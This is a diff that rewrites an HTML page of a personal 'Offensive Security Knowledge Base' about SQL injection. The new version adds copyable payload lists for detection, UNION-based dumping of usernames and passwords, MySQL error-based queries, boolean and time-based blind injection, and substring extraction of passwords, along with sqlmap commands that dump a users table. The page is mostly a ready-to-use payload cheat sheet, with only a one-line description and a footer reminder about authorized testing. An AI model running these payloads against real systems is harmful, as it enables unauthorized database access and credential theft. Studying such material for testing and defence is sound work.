@@ -1,191 +1,156 @@
-
-    <!DOCTYPE html>
-    <html>
-    <head>
-    <title>SQL Injection</title>
-    <link rel="stylesheet" href="../style.css">
-    </head>
-    <body>
-
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
 <nav class="navbar">
-<div class="container nav">
-<div class="logo">Saikumar <span>Infosec</span></div>
-</div>
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Web Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
 </nav>
-
-
-    <section class="hero">
-    <div class="container">
-
-    <div class="badge">Web Vulnerability</div>
-
-    <h1>
-    SQL Injection
-    <span>Offensive Exploitation Guide</span>
-    </h1>
-
-    <p>Database compromise via unsanitized queries.</p>
-
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Web Security</a> / SQL Injection
     </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>Meta Grid</h2>
-
-    <div class="grid">
-
-    <div class="card">
-    <h3>Authentication</h3>
-    <p>User / Anonymous</p>
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical | A03</span>
+      <h1>💉 SQL Injection</h1>
+      <div class="meta-grid">
+        <div class="meta-item"><strong>OWASP</strong><span>A03:2021</span></div>
+        <div class="meta-item"><strong>CVSS</strong><span>9.8</span></div>
+        <div class="meta-item"><strong>Type</strong><span>Injection</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Easy</span></div>
+      </div>
     </div>
-
-    <div class="card">
-    <h3>Attack Surface</h3>
-    <p>Headers, forms, APIs, parameters.</p>
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>SQL injection occurs when user input is incorporated into SQL queries without proper sanitization, allowing attackers to manipulate database queries and access unauthorized data.</p>
     </div>
+    <div class="content-section" id="in-band">
+      <h2>🎯 In-Band SQLi</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Basic detection
+'
+"
+OR 1=1--
+OR '1'='1
 
-    <div class="card">
-    <h3>Impact</h3>
-    <p>Privilege escalation and compromise.</p>
+# Union-based
+' UNION SELECT NULL--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT username, password FROM users--
+
+# Error-based (MySQL)
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--</pre>
+      </div>
     </div>
+    <div class="content-section" id="blind">
+      <h2>👻 Blind SQLi</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Boolean-based
+' AND 1=1--
+' AND 1=2--
 
+# Time-based
+' AND SLEEP(5)--
+' AND (SELECT CASE WHEN 1=1 THEN SLEEP(5) END)--
+
+# Substring extraction
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--</pre>
+      </div>
     </div>
+    <div class="content-section" id="tools">
+      <h2>🛠️ Automated Tools</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># SQLMap
+sqlmap -u "http://target.com/?id=1" --batch --dbs
+sqlmap -u "http://target.com/?id=1" -D database --tables
+sqlmap -u "http://target.com/?id=1" -D database -T users --dump
 
+# Manual exploitation
+# Identify DB type from error messages
+# Adjust payloads for MySQL, PostgreSQL, MSSQL, Oracle</pre>
+      </div>
     </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>Burp Workflow</h2>
-
-    <div class="card">
-    <ol>
-    <li>Intercept request</li>
-    <li>Send to repeater</li>
-    <li>Inject payload</li>
-    <li>Observe response</li>
-    </ol>
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank">SQLMap</a></li>
+        <li><a href="https://pentester.land/tutorials/sql-injection-practical" target="_blank">SQLi Practical Guide</a></li>
+      </ul>
     </div>
-
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>Advanced Payloads</h2>
-
-    <button class="copy-btn" onclick="copyCode('payloads')">Copy</button>
-
-    <div class="code">
-<pre id="payloads">
-Payload 1
-Payload 2
-Payload 3
-WAF bypasses
-Polyglots
-</pre>
-    </div>
-
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>PoC</h2>
-
-    <div class="code">
-<pre>
-Exact reproduction steps
-HTTP requests
-Expected behavior
-Observed behavior
-</pre>
-    </div>
-
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>Advanced Mitigation</h2>
-
-    <div class="card">
-    <ul>
-    <li>Parameterized queries</li>
-    <li>Strict CSP</li>
-    <li>Least privilege</li>
-    <li>Defense in depth</li>
-    </ul>
-    </div>
-
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>Retest Steps</h2>
-
-    <table>
-    <tr>
-    <th>Step</th>
-    <th>Validation</th>
-    </tr>
-
-    <tr>
-    <td>1</td>
-    <td>Retest payload execution</td>
-    </tr>
-
-    </table>
-
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>Attack Chains</h2>
-
-    <div class="card">
-    <p>
-    Initial access → privilege escalation → persistence → exfiltration
-    </p>
-    </div>
-
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>References</h2>
-
-    <div class="card">
-    <ul>
-    <li>OWASP</li>
-    <li>HackTricks</li>
-    <li>PayloadsAllTheThings</li>
-    </ul>
-    </div>
-
-    </div>
-    </section>
-
-    <footer class="footer">
-    <div class="container">
-    <p>Ultimate Cybersecurity Platform</p>
-    </div>
-    </footer>
-
-    <script src="../script.js"></script>
-
-    </body>
-    </html>
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+  </div>
+</main>
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); text.textContent = 'Light'; }
+      else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); text.textContent = 'Dark'; }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  if (localStorage.getItem('theme-preference') === 'light') document.body.classList.add('light');
+});
+function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.textContent = 'Copied!'; setTimeout(() => { btn.textContent = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
